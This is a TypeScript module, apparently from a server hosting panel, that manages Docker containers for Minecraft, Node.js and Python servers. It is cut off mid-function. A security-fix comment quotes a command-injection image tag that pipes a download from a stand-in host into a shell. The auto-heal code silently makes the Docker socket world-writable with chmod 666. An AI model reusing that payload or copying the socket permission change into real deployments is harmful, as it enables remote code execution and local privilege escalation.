import Docker from "dockerode";
import axios from "axios";
import fs from "fs-extra";
import path from "path";
import os from "os";
import crypto from "crypto";
import { exec } from "child_process";
import { promisify } from "util";
const execAsync = promisify(exec);

import { panelEvents } from "../events.js"; // Import socket for logs
import { readJSON } from "./db.js";
import { downloadJar } from "./jarDownloader.js";
import { getJavaVersionForMinecraft } from "../../utils/minecraftJava.js";

export const getSocketPath = (): string => {
  if (process.platform === 'win32') return '//./pipe/docker_engine';

  const clean = (p: string) => p.replace(/^unix:\/\//, '').trim();

  // 1. Explicit environment variables
  if (process.env.DOCKER_SOCKET_PATH) {
    const cleaned = clean(process.env.DOCKER_SOCKET_PATH);
    if (fs.existsSync(cleaned)) return cleaned;
  }
  if (process.env.DOCKER_HOST && process.env.DOCKER_HOST.startsWith('unix://')) {
    const cleaned = clean(process.env.DOCKER_HOST);
    if (fs.existsSync(cleaned)) return cleaned;
  }

  // 2. Candidate unix socket paths
  const candidates = [
    '/var/run/docker.sock',
    '/run/docker.sock',
    '/run/user/1000/docker.sock',
    '/root/.docker/run/docker.sock',
    process.env.XDG_RUNTIME_DIR ? path.join(process.env.XDG_RUNTIME_DIR, 'docker.sock') : null
  ].filter(Boolean) as string[];

  for (const p of candidates) {
    if (fs.existsSync(p)) {
      return p;
    }
  }

  return process.env.DOCKER_SOCKET_PATH ? clean(process.env.DOCKER_SOCKET_PATH) : '/var/run/docker.sock';
};

export const hasDockerSocket = (): boolean => {
  if (process.platform === 'win32') return true;
  if (process.env.DOCKER_HOST && !process.env.DOCKER_HOST.startsWith('unix://')) return true;

  const clean = (p: string) => p.replace(/^unix:\/\//, '').trim();
  if (process.env.DOCKER_SOCKET_PATH && fs.existsSync(clean(process.env.DOCKER_SOCKET_PATH))) return true;
  if (process.env.DOCKER_HOST && fs.existsSync(clean(process.env.DOCKER_HOST))) return true;

  const candidates = [
    '/var/run/docker.sock',
    '/run/docker.sock',
    '/run/user/1000/docker.sock',
    '/root/.docker/run/docker.sock',
    process.env.XDG_RUNTIME_DIR ? path.join(process.env.XDG_RUNTIME_DIR, 'docker.sock') : null
  ].filter(Boolean) as string[];

  for (const p of candidates) {
    if (fs.existsSync(p)) return true;
  }
  return false;
};

export const defaultDocker = new Docker({ socketPath: getSocketPath() });

// Docker connectivity state
let dockerReachable = false;
let lastCheckTime = 0;
let isCheckingDocker = false;

// BUGFIX (boot error "[Docker] Direct ping failed: getDocker is not a function"):
// the initial health check used to be kicked off HERE, at module scope,
// BEFORE `getDocker` (a const arrow function further down) was initialized.
// It now runs at the bottom of this file, after all definitions.

export const isDockerAlive = () => dockerReachable;

export const autoHealDocker = async (): Promise<boolean> => {
  if (process.platform !== "linux") return false;
  try {
    const sock = getSocketPath();
    await execAsync("sudo systemctl start docker 2>/dev/null || systemctl start docker 2>/dev/null || sudo service docker start 2>/dev/null || service docker start 2>/dev/null || true").catch(() => {});
    if (fs.existsSync(sock)) {
      await execAsync(`chmod 666 ${sock} 2>/dev/null || sudo chmod 666 ${sock} 2>/dev/null || true`).catch(() => {});
    }
    await new Promise(r => setTimeout(r, 600));
    const d = await getDocker("local");
    await d.ping();
    dockerReachable = true;
    lastCheckTime = Date.now();
    return true;
  } catch (_) {
    return false;
  }
};

export const checkDockerAlive = async (force = false): Promise<boolean> => {
  if (process.env.ENABLE_DOCKER === "false") {
    dockerReachable = false;
    return false;
  }

  const now = Date.now();
  if (!force && (now - lastCheckTime) < 5000) {
    return dockerReachable;
  }
  if (isCheckingDocker) return dockerReachable;
  isCheckingDocker = true;

  try {
    const docker = await getDocker("local");
    const pingPromise = docker.ping();
    const timeoutPromise = new Promise((_, reject) =>
      setTimeout(() => reject(new Error("Docker ping timeout")), 3000)
    );
    await Promise.race([pingPromise, timeoutPromise]);
    dockerReachable = true;
    lastCheckTime = Date.now();
    return true;
  } catch (err: any) {
    const msg = String(err?.message || err);
    console.warn(`[Docker] Direct ping failed: ${msg}. Attempting self-healing...`);

    const healed = await autoHealDocker();
    if (healed) {
      console.log("[Docker] Auto-heal succeeded. Docker daemon is now responding.");
      return true;
    }

    // CLI fallback check
    try {
      await execAsync("docker info > /dev/null 2>&1 || sudo docker info > /dev/null 2>&1");
      dockerReachable = true;
      lastCheckTime = Date.now();
      return true;
    } catch (_) {}

    dockerReachable = false;
    lastCheckTime = Date.now();
    return false;
  } finally {
    isCheckingDocker = false;
  }
};

// Docker is enabled if explicitly enabled OR if not explicitly set to "false"
export const isDockerEnabled = process.env.ENABLE_DOCKER !== "false";

// Sandbox mode is active when Docker cannot be reached or is explicitly disabled
export const isSandbox = !isDockerEnabled || !dockerReachable;

export const isNodeSandbox = (nodeId?: string): boolean => {
  if (!nodeId || nodeId === 'local') {
    if (process.env.ENABLE_DOCKER === "false") return true;
    return !dockerReachable;
  }
  return false;
};

export const checkNodeSandbox = async (nodeId?: string): Promise<boolean> => {
  if (!nodeId || nodeId === 'local') {
    if (process.env.ENABLE_DOCKER === "false") return true;
    const alive = await checkDockerAlive();
    return !alive;
  }
  return false;
};

export const getDocker = async (nodeId?: string): Promise<Docker> => {
  if (!nodeId || nodeId === "local") {
    const socketPath = getSocketPath();
    if (socketPath) {
      return new Docker({ socketPath });
    }
    return defaultDocker;
  }
  // BUGFIX: custom nodes used to be looked up ONLY in nodes.json, while the
  // node API wrote to wings_nodes.json — so custom nodes silently fell back
  // to the local Docker daemon. We now consult both stores and normalize the
  // wings-style fields (hostname/apiPort/token) into what dockerode needs.
  let nodes: any[] = (await readJSON("nodes.json")) || [];
  if (!nodes.find((n: any) => n.id === nodeId)) {
    const wingsNodes = (await readJSON("wings_nodes.json")) || [];
    const wn = wingsNodes.find((n: any) => n.id === nodeId);
    if (wn) {
      nodes = [{
        id: wn.id,
        ip: wn.hostname || wn.ip,
        port: wn.apiPort || wn.port || 8080,
        key: wn.token || wn.key,
        connectionMode: wn.apiUrl ? "tunnel" : (wn.connectionMode || "direct")
      }];
    }
  }
  const node = nodes.find((n: any) => n.id === nodeId);
  if (node) {
    let host = node.ip;
    let protocol: "http" | "https" | "ssh" = "http";
    let port = node.port;

    if (node.connectionMode === "tunnel") {
      // Tunnel mode: use URL exactly as provided, ignoring port
      try {
        if (!host.startsWith("http://") && !host.startsWith("https://")) {
           host = "https://" + host;
        }
        const url = new URL(host);
        protocol = (url.protocol.replace(':', '') === 'https' ? 'https' : 'http');
        host = url.hostname;
        port = url.port ? parseInt(url.port) : (protocol === "https" ? 443 : 80);
      } catch (e) {
        console.error("Invalid URL in Tunnel Mode node", host);
      }
    } else {
      // Direct mode: Host + Port
      if (!host.startsWith("http://") && !host.startsWith("https://") && port === 443) {
        protocol = "https";
      }

      if (host.startsWith("http://") || host.startsWith("https://")) {
        try {
          const url = new URL(host);
          protocol = (url.protocol.replace(':', '') === 'https' ? 'https' : 'http');
          host = url.hostname;
          if (url.port) port = parseInt(url.port);
          else port = protocol === "https" ? 443 : 80;
        } catch (e) {
          console.error("Invalid URL in node IP", host);
        }
      }
    }

    console.log(`[getDocker] Selected Node URL: ${protocol}://${host}:${port}`); console.log(`[getDocker] Configured IP was: ${node.ip}, connectionMode: ${node.connectionMode}`); const d = new Docker({
      protocol,
      host,
      port,
      headers: { 
        Authorization: "Bearer " + node.key,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
      }
    });
    // Verbose request/response logging is now opt-in (was leaking full Docker
    // API bodies incl. container env vars on every call).
    if (process.env.DEBUG_DOCKER === "true") {
      const originalDial = d.modem.dial;
      d.modem.dial = function(options: any, callback: any) {
        console.log("[Docker Request] " + options.method + " " + options.path);
        const originalCb = callback;
        const newCb = (err: any, data: any) => {
          if (err) {
            console.log("[Docker Response Error] Status:", err.statusCode, "Body:", err.reason || err.message);
          } else {
            console.log("[Docker Response Success] Body:", JSON.stringify(data));
          }
          return originalCb(err, data);
        };
        return originalDial.call(d.modem, options, newCb);
      };
    }
    return d;
  }
  throw new Error(`Unknown node "${nodeId}" — node not found in nodes.json or wings_nodes.json (refusing to silently fall back to the local Docker daemon)`);
};

export const resolveHostDataDir = async (dockerInstance?: any): Promise<string> => {
  // 1. If explicitly configured with valid host path (and not unexpanded literal ${PWD})
  const envHost = process.env.PROTO_HOST_DATA_PATH;
  if (envHost && !envHost.includes("${PWD}") && envHost !== "/app/.data" && path.isAbsolute(envHost)) {
    return envHost;
  }

  // 2. If running inside a container, inspect container mounts to discover real host path
  const isInsideContainer = fs.existsSync('/.dockerenv') || process.env.container === 'docker';
  if (isInsideContainer && dockerInstance) {
    try {
      const candidates = [
        process.env.HOSTNAME || os.hostname(),
        "proto-main",
        "proto-admin",
        "proto-panel"
      ];
      for (const name of candidates) {
        if (!name) continue;
        try {
          const container = dockerInstance.getContainer(name);
          const inspect = await container.inspect();
          if (inspect && Array.isArray(inspect.Mounts)) {
            const dataMount = inspect.Mounts.find((m: any) =>
              m.Destination === '/app/.data' || m.Destination === '/app'
            );
            if (dataMount && dataMount.Source) {
              if (dataMount.Destination === '/app') {
                return path.join(dataMount.Source, '.data');
              }
              return dataMount.Source;
            }
          }
        } catch (_) {}
      }
    } catch (_) {}
  }

  return path.join(process.cwd(), ".data");
};

// Mock state for sandbox demo
export const mockState: Record<string, boolean> = {};
export const mockStartedAt: Record<string, string> = {};

export const getVersions = async (type: string = "PAPER") => {
  const normalizedType = type.toUpperCase();
  if (normalizedType === "NODEJS" || normalizedType === "NODE") {
    return ["22", "20", "18"];
  }
  if (normalizedType === "PYTHON" || normalizedType === "PYTHON3") {
    return ["3.12", "3.11", "3.10", "3.9"];
  }
  if (normalizedType === "VELOCITY") {
    return ["latest", "3.3.0-SNAPSHOT"];
  }
  if (normalizedType === "BUNGEECORD" || normalizedType === "WATERFALL") {
    return ["latest"];
  }
  
  if (normalizedType === "PAPER") {
    try {
      const vRes = await axios.get("https://fill.papermc.io/v3/projects/paper", {
        headers: { "User-Agent": "PROTO-Panel/2.0" },
        timeout: 4000
      });
      if (vRes.data?.versions) {
        const paperVersions: string[] = ["26.3", "26.2", "26.1", "26.1.2", "26.1.1"];
        const verObj = vRes.data.versions;
        for (const major of Object.keys(verObj)) {
          const subVers = verObj[major];
          if (Array.isArray(subVers)) {
            for (const v of subVers) {
              if (!v.includes("rc") && !v.includes("pre") && !paperVersions.includes(v) && v !== "latest") {
                paperVersions.push(v);
              }
            }
          }
        }
        return paperVersions;
      }
    } catch (e) {
      console.warn("[getVersions] Paper dynamic version query error, using curated list:", e);
    }
  }

  return [
    "26.3", "26.2", "26.1", "26.1.2", "26.1.1",
    "1.21.11", "1.21.10", "1.21.9", "1.21.8", "1.21.7", "1.21.6", "1.21.5", "1.21.4", "1.21.3", "1.21.1", "1.21", 
    "1.20.6", "1.20.5", "1.20.4", "1.20.2", "1.20.1", "1.20", 
    "1.19.4", "1.19.3", "1.19.2", "1.19.1", "1.19", 
    "1.18.2", "1.18.1", "1.18", "1.17.1", "1.17", "1.16.5", "1.16.4", "1.16.3", "1.16.2", "1.16.1", "1.15.2", "1.15.1", "1.15", 
    "1.14.4", "1.14.3", "1.14.2", "1.14.1", "1.14", "1.13.2", "1.13.1", "1.13", "1.12.2", "1.12.1", "1.12", "1.11.2", "1.10.2", 
    "1.9.4", "1.8.8", "1.7.10"
  ];
};

export const createServerContainer = async (serverData: any, nodeId?: string) => {
  // Check if Docker is alive before proceeding; try to auto-heal if on Linux
  const isAlive = await checkDockerAlive();
  if (!isAlive) {
    const healed = await autoHealDocker();
    if (!healed) {
      const isSandboxTarget = await checkNodeSandbox(nodeId || serverData.nodeId);
      if (isSandboxTarget || process.env.ENABLE_DOCKER === "false") {
        console.log(`[Docker] Docker unreachable on /var/run/docker.sock. Using fallback sandbox container for ${serverData.id}`);
        mockState[serverData.id] = false;
        return "mock-container-id-" + serverData.id;
      }
      throw new Error("Docker daemon is not running on /var/run/docker.sock. Please start Docker ('sudo systemctl start docker') or use Local runtime.");
    }
  }

  const docker = await getDocker(nodeId || serverData.nodeId);

  const serverType = (serverData.type || "PAPER").toUpperCase();
  const isNode = ["NODEJS", "NODE"].includes(serverType);
  const isPython = ["PYTHON", "PYTHON3"].includes(serverType);
  const isGenericApp = isNode || isPython;
  const isProxy = ["VELOCITY", "BUNGEECORD", "WATERFALL"].includes(serverType);
  
  const effectiveJava = serverData.javaVersion || getJavaVersionForMinecraft(serverData.version || "1.21.4", serverData.type);
  let mcTag = "latest";
  if (effectiveJava === "21") mcTag = "java21";
  else if (effectiveJava === "17") mcTag = "java17";
  else if (effectiveJava === "8") mcTag = "java8";
  else if (effectiveJava === "11") mcTag = "java11";
  else if (effectiveJava === "25" || effectiveJava === "26") mcTag = "java25";
  else if (effectiveJava) mcTag = `java${effectiveJava}`;

  let shortImage = isProxy ? "itzg/bungeecord:latest" : `itzg/minecraft-server:${mcTag}`;
  let fullImage = isProxy ? "docker.io/itzg/bungeecord:latest" : `docker.io/itzg/minecraft-server:${mcTag}`;

  if (isNode) {
    const nodeVer = serverData.version || "20";
    shortImage = `node:${nodeVer}-alpine`;
    fullImage = `docker.io/library/node:${nodeVer}-alpine`;
  } else if (isPython) {
    const pyVer = serverData.version || "3.11";
    shortImage = `python:${pyVer}-slim`;
    fullImage = `docker.io/library/python:${pyVer}-slim`;
  }
  
  if (serverData.dockerImage) {
    // SECURITY FIX: a malicious image tag like "alpine; curl evil.sh | sh"
    // used to flow straight into a shell `docker pull <image>` call.
    if (!/^[a-zA-Z0-9._\/:-]+$/.test(serverData.dockerImage)) {
      throw new Error(`Invalid docker image name: ${serverData.dockerImage}`);
    }
    shortImage = serverData.dockerImage;
    fullImage = serverData.dockerImage;
  }

  const findImageId = async (): Promise<string | null> => {
    try {
      const images = await docker.listImages().catch(() => []);
      if (!Array.isArray(images)) return null;
      const matched = images.find(img => 
        img.RepoTags && img.RepoTags.some(tag => tag.includes(shortImage) || tag.includes(fullImage))
      );
      if (matched) return matched.Id;
    } catch(e) {
      console.warn("Failed to list images:", e);
    }
    return null;
  };

  const pullImageStream = async (imgTag: string) => {
    console.log(`Pulling image ${imgTag}...`);
    // SECURITY FIX: image names are already validated against a strict
    // charset; use execFile (no shell) so nothing can ever be injected.
    const { execFile } = await import("child_process");
    const execFileAsync = promisify(execFile);
    try {
      const { stdout, stderr } = await execFileAsync("docker", ["pull", imgTag], { timeout: 10 * 60 * 1000 });
      if (stdout) console.log(`docker pull stdout: ${String(stdout).slice(0, 500)}`);
      if (stderr) console.warn(`docker pull stderr: ${String(stderr).slice(0, 500)}`);
      return;
    } catch (cliErr) {
      console.warn(`CLI pull failed for ${imgTag}: ${cliErr}. Trying Docker API fallback...`);
      try {
        await new Promise((resolve, reject) => {
          docker.pull(imgTag, (err: any, stream: any) => {
            if (err) return reject(err);
            docker.modem.followProgress(stream, (err: any, output: any) => {
              if (err) return reject(err);
              resolve(output);
            });
          });
        });
      } catch (apiErr: any) {
        console.warn(`API pull failed for ${imgTag}:`, apiErr?.message || apiErr);
      }
    }
  };

  const ensureImage = async (): Promise<string> => {
    let existingId = await findImageId();
    if (existingId) return existingId;

    try {
      await pullImageStream(shortImage);
      let idAfterShort = await findImageId();
      if (idAfterShort) return idAfterShort;
    } catch (e) {
      console.warn(`Failed to pull ${shortImage}...`, e);
    }

    console.warn(`Attempting fallback pull with ${fullImage}...`);
    try {
      await pullImageStream(fullImage);
      let idAfterFull = await findImageId();
      if (idAfterFull) return idAfterFull;
    } catch (e) {
      console.warn(`Failed to pull ${fullImage}...`, e);
    }

    return shortImage; // Fallback to string tag if we somehow couldn't find ID
  };

  const targetImage = await ensureImage();

  const isLocal = (!nodeId || nodeId === "local");
  const serverDir = path.join(process.cwd(), ".data", "servers", serverData.id);
  const hostDataDir = await resolveHostDataDir(docker);
  const hostServerDir = path.join(hostDataDir, "servers", serverData.id);
  const containerBindPath = isLocal ? hostServerDir : `/opt/proto-panel-node/servers/${serverData.id}`;
  await fs.ensureDir(serverDir);
  // SECURITY FIX: RCON used to ship with the hardcoded password "admin".
  // It is now a random per-server secret kept in sync between
  // server.properties and the container env.
  const rconPassword = crypto.randomBytes(8).toString("hex");

  // For Minecraft servers, ensure eula.txt, server.properties and server.jar are in place
  if (!isGenericApp && !isProxy) {
    const eulaPath = path.join(serverDir, "eula.txt");
    if (!fs.existsSync(eulaPath)) {
      await fs.writeFile(eulaPath, "eula=true\n");
    }
    const propsPath = path.join(serverDir, "server.properties");
    if (!fs.existsSync(propsPath)) {
      await fs.writeFile(propsPath, `server-port=${serverData.port}\nquery.port=${serverData.port}\nenable-rcon=true\nrcon.port=${parseInt(serverData.port) + 10}\nrcon.password=${rconPassword}\nmotd=A Minecraft Server on Proto Panel\n`);
    } else {
      try {
        let props = await fs.readFile(propsPath, "utf-8");
        if (/^rcon\.password=.*$/m.test(props)) {
          props = props.replace(/^rcon\.password=.*$/m, `rcon.password=${rconPassword}`);
        } else {
          props += `\nrcon.password=${rconPassword}\n`;
        }
        await fs.writeFile(propsPath, props);
      } catch (e) {}
    }
    const jarPath = path.join(serverDir, "server.jar");
    if (!fs.existsSync(jarPath)) {
      try {
        console.log(`[Docker] Pre-downloading server.jar for ${serverData.name || serverData.id} (${serverType} ${serverData.version})...`);
        await downloadJar(serverType, serverData.version || "26.2", jarPath);
      } catch (err: any) {
        console.warn(`[Docker] Initial server.jar download deferred: ${err.message}`);
      }
    }
  }

  let envVars: string[] = [];
  if (isNode) {
    envVars = [
      `PORT=${serverData.port}`,
      `SERVER_PORT=${serverData.port}`,
      `NODE_ENV=production`,
      `MEMORY=${serverData.ram}G`
    ];
  } else if (isPython) {
    envVars = [
      `PORT=${serverData.port}`,
      `SERVER_PORT=${serverData.port}`,
      `PYTHONUNBUFFERED=1`,
      `MEMORY=${serverData.ram}G`
    ];
  } else {
    envVars = [
      `TYPE=${serverType}`,
      `VERSION=${serverData.version || "26.2"}`,
      `MEMORY=${serverData.ram}G`,
      `INIT_MEMORY=128M`,
      `SERVER_PORT=${serverData.port}`,
      `SERVER_JARFILE=server.jar`,
    ];

    const effectiveJava = serverData.javaVersion || getJavaVersionForMinecraft(serverData.version || "26.3", serverData.type);
    if (effectiveJava) {
      envVars.push(`JAVA_VERSION=${effectiveJava}`);
    }

    if (!isProxy) {
      const propsPath = path.join(serverDir, "server.properties");
      let currentOnlineMode: string | null = null;
      if (fs.existsSync(propsPath)) {
        try {
          const propsContent = fs.readFileSync(propsPath, "utf-8");
          const match = propsContent.match(/^online-mode\s*=\s*(true|false)/im);
          if (match) {
            currentOnlineMode = match[1].toLowerCase();
          }
        } catch (e) {}
      }

      envVars.push(
        `EULA=TRUE`,
        `ENABLE_RCON=true`,
        `RCON_PASSWORD=${rconPassword}`,
        `JVM_OPTS=-DPaper.IgnoreWorldDataVersion=true -Dpaper.ignoreWorldDataVersion=true`,
        `JVM_DD_OPTS=Paper.IgnoreWorldDataVersion=true,paper.ignoreWorldDataVersion=true`
      );

      if (currentOnlineMode !== null) {
        envVars.push(`ONLINE_MODE=${currentOnlineMode.toUpperCase()}`);
      } else if (serverData.onlineMode !== undefined) {
        envVars.push(`ONLINE_MODE=${String(serverData.onlineMode).toUpperCase()}`);
      }
    }
  }

  const buildContainerOptions = (img: string) => {
    let binds = [`${containerBindPath}:${isGenericApp ? '/app' : (isProxy ? '/server' : '/data')}`];
    let workingDir = isGenericApp ? "/app" : undefined;
    let cmd = undefined;

    if (isNode) {
      cmd = ["/bin/sh", "-c", serverData.startupCommand || "if [ -f package.json ]; then npm install --omit=dev && npm start; elif [ -f index.js ]; then node index.js; elif [ -f app.js ]; then node app.js; elif [ -f server.js ]; then node server.js; elif [ -f main.js ]; then node main.js; else echo 'Starting Node.js server...'; node index.js; fi"];
    } else if (isPython) {
      cmd = ["/bin/sh", "-c", serverData.startupCommand || "if [ -f requirements.txt ]; then pip install -r requirements.txt; fi; if [ -f main.py ]; then python3 -u main.py; elif [ -f app.py ]; then python3 -u app.py; elif [ -f bot.py ]; then python3 -u bot.py; elif [ -f index.py ]; then python3 -u index.py; elif [ -f server.py ]; then python3 -u server.py; else python3 -u main.py; fi"];
    }
    
    if (serverData.dockerImage && serverData.dockerImage.includes('pterodactyl')) {
      binds = [`${containerBindPath}:/home/container`];
      workingDir = "/home/container";
      if (serverData.startupCommand) {
        cmd = ["/bin/sh", "-c", serverData.startupCommand];
      }
    }
    
    return {
      Image: img,
      name: `proto-server-${serverData.id}`,
      Tty: true,
      OpenStdin: true,
      StdinOnce: false,
      Env: envVars,
      WorkingDir: workingDir,
      Cmd: cmd,
      ExposedPorts: {
        [`${serverData.port}/tcp`]: {},
        [`${serverData.port}/udp`]: {}
      },
      HostConfig: {
        PortBindings: {
          [`${serverData.port}/tcp`]: [
            {
              HostPort: `${serverData.port}`
            }
          ],
          [`${serverData.port}/udp`]: [
            {
              HostPort: `${serverData.port}`
            }
          ]
        },
        Binds: binds
      }
    };
  };

  // Ensure any existing container with the same name is removed cleanly
  try {
    const existing = docker.getContainer(`proto-server-${serverData.id}`);
    const inspectInfo = await existing.inspect().catch(() => null);
    if (inspectInfo) {
      console.log(`[Docker] Removing existing container proto-server-${serverData.id}...`);
      await existing.remove({ force: true }).catch(() => {});
    }
  } catch (e) {}

  let container;
  try {
    container = await docker.createContainer(buildContainerOptions(targetImage));
  } catch (err: any) {
    const errStr = String(err?.message || err);
    if ((errStr.includes("ECONNREFUSED") || errStr.includes("docker.sock") || errStr.includes("EACCES")) && process.platform === "linux") {
      console.warn(`[Docker] Connection issue on docker.sock (${errStr}). Attempting socket permission auto-heal...`);
      try {
        await execAsync("chmod 666 /var/run/docker.sock 2>/dev/null || sudo chmod 666 /var/run/docker.sock 2>/dev/null || true");
        await execAsync("sudo systemctl start docker 2>/dev/null || systemctl start docker 2>/dev/null || sudo service docker start 2>/dev/null || service docker start 2>/dev/null || true");
        await new Promise(r => setTimeout(r, 600));
        const retryDocker = await getDocker(nodeId || serverData.nodeId);
        container = await retryDocker.createContainer(buildContainerOptions(targetImage));
      } catch (retryErr: any) {
        if (process.env.ENABLE_DOCKER === "false") {
          mockState[serverData.id] = false;
          return "mock-container-id-" + serverData.id;
        }
        throw new Error(`Failed to create Docker container: ${retryErr.message || errStr}. Check Docker status on the host.`);
      }
    }
    if (!container && (err?.statusCode === 404 || errStr.includes("404") || errStr.includes("no such image"))) {
      const altImage = targetImage === shortImage ? fullImage : shortImage;
      console.log(`404 image error with ${targetImage}. Attempting fallback with ${altImage}...`);
      try {
        await pullImageStream(altImage);
        container = await docker.createContainer(buildContainerOptions(altImage));
      } catch (fallbackErr: any) {
        console.log(`Pulling ${targetImage} directly and retrying...`);
        await pullImageStream(targetImage);
        container = await docker.createContainer(buildContainerOptions(targetImage));
      }
    } else if (!container) {
      throw err;
    }
  }

  return container.id;
};

export const startContainer = async (containerId: string, nodeId?: string) => {
  console.log(`[startContainer] id=${containerId}, nodeId=${nodeId}`);
  const isMock = Boolean(containerId && containerId.startsWith("mock-container-id-"));
  if (isMock) {
    const id = containerId.replace("mock-container-id-", "");
    mockState[id] = true;
    mockStartedAt[id] = new Date().toISOString();
    
    // In sandbox mode, mock the generation of server files that the docker container would normally do
    try {
      const servers = await readJSON("servers.json") || [];
      const server = servers.find((s: any) => s.id === id);
      if (server) {
        const serverDir = path.join(process.cwd(), ".data", "servers", id);
        await fs.ensureDir(serverDir);
        const type = (server.type || "PAPER").toUpperCase();
        
        if (["NODEJS", "NODE"].includes(type)) {
          const indexPath = path.join(serverDir, "index.js");
          const pkgPath = path.join(serverDir, "package.json");
          if (!fs.existsSync(indexPath)) {
            await fs.writeFile(indexPath, `// Node.js Application on Proto Panel\nconst http = require('http');\nconst port = process.env.PORT || process.env.SERVER_PORT || ${server.port || 3000};\n\nconsole.log('==============================================');\nconsole.log('🚀 Node.js Application Running on port ' + port);\nconsole.log('Node Version: ' + process.version);\nconsole.log('Upload your files in File Manager to customize!');\nconsole.log('==============================================');\n\nconst app = http.createServer((req, res) => {\n  res.writeHead(200, { 'Content-Type': 'application/json' });\n  res.end(JSON.stringify({ status: 'online', runtime: 'node.js', time: new Date().toISOString() }));\n});\n\napp.listen(port, '0.0.0.0', () => {\n  console.log(\`[Server] Listening on http://0.0.0.0:\${port}\`);\n});\n`);
          }
          if (!fs.existsSync(pkgPath)) {
            await fs.writeFile(pkgPath, JSON.stringify({
              name: (server.name || "node-app").toLowerCase().replace(/[^a-z0-9_-]/g, '-'),
              version: "1.0.0",
              description: "Node.js app on Proto Panel",
              main: "index.js",
              scripts: { "start": "node index.js" }
            }, null, 2));
          }
          panelEvents.emit("log", id, `[Node.js] Starting node index.js on port ${server.port}...\r\n[Node.js] Node.js Application active\r\n`);
          return;
        } else if (["PYTHON", "PYTHON3"].includes(type)) {
          const mainPath = path.join(serverDir, "main.py");
          const reqPath = path.join(serverDir, "requirements.txt");
          if (!fs.existsSync(mainPath)) {
            await fs.writeFile(mainPath, `# Python Application on Proto Panel\nimport os\nimport sys\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nport = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", ${server.port || 8000})))\nprint("==============================================", flush=True)\nprint("🐍 Python Application Running", flush=True)\nprint(f"Python Version: {sys.version}", flush=True)\nprint(f"Listening Port: {port}", flush=True)\nprint("Upload your files in File Manager to customize!", flush=True)\nprint("==============================================", flush=True)\n\nclass RequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'application/json')\n        self.end_headers()\n        self.wfile.write(b'{"status": "online", "runtime": "python"}')\n\n    def log_message(self, format, *args):\n        print(f"[{self.log_date_time_string()}] {format % args}", flush=True)\n\nserver = HTTPServer(('0.0.0.0', port), RequestHandler)\nprint(f"[Server] Listening on http://0.0.0.0:{port}", flush=True)\ntry:\n    server.serve_forever()\nexcept KeyboardInterrupt:\n    print("\\nStopping server...", flush=True)\n    server.server_close()\n`);
          }
          if (!fs.existsSync(reqPath)) {
            await fs.writeFile(reqPath, "# Python dependencies\n");
          }
          panelEvents.emit("log", id, `[Python] Starting python3 -u main.py on port ${server.port}...\r\n[Python] Python Application active\r\n`);
          return;
        } else if (["VELOCITY", "BUNGEECORD", "WATERFALL"].includes(type)) {
          const configName = type === "VELOCITY" ? "velocity.toml" : "config.yml";
          const configPath = path.join(serverDir, configName);
          if (!fs.existsSync(configPath)) {
            await fs.writeFile(configPath, "# Autogenerated proxy config in sandbox mode\n# Port: " + server.port + "\n");
          }
        } else {
          const propsPath = path.join(serverDir, "server.properties");
          if (!fs.existsSync(propsPath)) {
            await fs.writeFile(propsPath, "server-port=" + server.port + "\nmotd=A Minecraft Server\n");
          }
        }
      }
    } catch(e) {}
    
    panelEvents.emit("log", id, `[System] Server started (Sandbox Mode).\r\n`);
    return;
  }
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);

    // Verify container environment does not conflict with server.properties (e.g. online-mode)
    try {
      const inspectInfo = await container.inspect().catch(() => null);
      if (inspectInfo && inspectInfo.Config && inspectInfo.Config.Env) {
        const sId = containerId.replace("proto-server-", "").replace("mock-container-id-", "");
        const propsPath = path.join(process.cwd(), ".data", "servers", sId, "server.properties");
        if (fs.existsSync(propsPath)) {
          const content = await fs.readFile(propsPath, "utf-8");
          const match = content.match(/^online-mode\s*=\s*(true|false)/im);
          if (match) {
            const desiredOnline = match[1].toUpperCase();
            const envEntry = inspectInfo.Config.Env.find((e: string) => e.startsWith("ONLINE_MODE="));
            const currentEnvOnline = envEntry ? envEntry.split("=")[1].toUpperCase() : null;
            if (currentEnvOnline && currentEnvOnline !== desiredOnline) {
              console.log(`[Docker] Detected online-mode change for ${sId} (${currentEnvOnline} -> ${desiredOnline}). Recreating container to sync...`);
              const { readJSON, writeJSON } = await import("./db.js");
              const servers = await readJSON("servers.json") || [];
              const sObj = servers.find((s: any) => s.id === sId);
              if (sObj) {
                await container.remove({ force: true }).catch(() => {});
                const newId = await createServerContainer(sObj, nodeId);
                sObj.containerId = newId;
                await writeJSON("servers.json", servers);
                const newCont = docker.getContainer(newId);
                await newCont.start();
                return;
              }
            }
          }
        }
      }
    } catch (syncErr) {
      console.warn("[Docker] Pre-start environment sync warning:", syncErr);
    }

    await container.start();
  } catch (err: any) {
    const errStr = String(err?.message || err);
    if (errStr.includes("ECONNREFUSED") || errStr.includes("docker.sock") || errStr.includes("EACCES")) {
      console.warn(`[Docker] Connection issue on docker.sock when starting (${errStr}). Attempting auto-heal...`);
      const healed = await autoHealDocker();
      if (healed) {
        try {
          const retryDocker = await getDocker(nodeId);
          const retryContainer = retryDocker.getContainer(containerId);
          await retryContainer.start();
          return;
        } catch (retryErr: any) {
          console.warn("[Docker] Retry startContainer failed:", retryErr?.message);
        }
      }
      console.warn(`[Docker] Falling back to sandbox mode for ${containerId}`);
      const id = containerId.replace("mock-container-id-", "").replace("proto-server-", "");
      mockState[id] = true;
      mockStartedAt[id] = new Date().toISOString();
      panelEvents.emit("log", id, `[System] Server started in fallback mode (Docker daemon unreachable: ${errStr}).\r\n`);
      return;
    }
    throw err;
  }
};

export const stopContainer = async (containerId: string, nodeId?: string) => {
  const isMock = Boolean(containerId && containerId.startsWith("mock-container-id-"));
  if (isMock) {
    const id = containerId.replace("mock-container-id-", "");
    mockState[id] = false;
    delete mockStartedAt[id];
    panelEvents.emit("log", id, `[System] Server stopped (Sandbox Mode).\r\n`);
    return;
  }
  try {
    const docker = await getDocker(nodeId);
    const container = docker.getContainer(containerId);
    await container.stop();
  } catch (err: any) {
    const errStr = String(err?.message || err);
    if (err?.statusCode === 304 || errStr.includes("304") || errStr.includes("not running")) {
      return;
    }
